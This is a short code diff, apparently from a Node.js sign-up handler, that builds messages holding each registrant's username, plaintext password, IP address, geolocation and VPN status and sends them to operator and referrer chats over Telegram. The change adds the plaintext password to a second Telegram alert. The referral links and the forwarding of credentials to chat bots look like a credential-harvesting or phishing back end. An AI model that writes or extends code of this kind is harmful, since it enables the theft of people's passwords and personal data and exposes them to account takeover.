@@ -779,13 +779,13 @@ Username: *${escapeMarkdown(username)}*
 Password: *${password}*\n
 Referrer: *${escapeMarkdown(admin.username)}*
 Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}\nID:${studentId}
-raw data: ${location._raw}
-IP ${ip}
+
+IP ${ip[0]}
 \n\n VPN : ${vpn}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);
 
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from ${escapeMarkdown(location.country || "Unknown")}`);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Client ${location.country_code} client: *${username} ${password}* (via ${admin.username}'s link) from ${escapeMarkdown(location.country || "Unknown")}`);
 
     return res.json({ success: true, studentId, admin: { username: admin.username, phone: admin.phone }, student:student });
   } catch (e) {
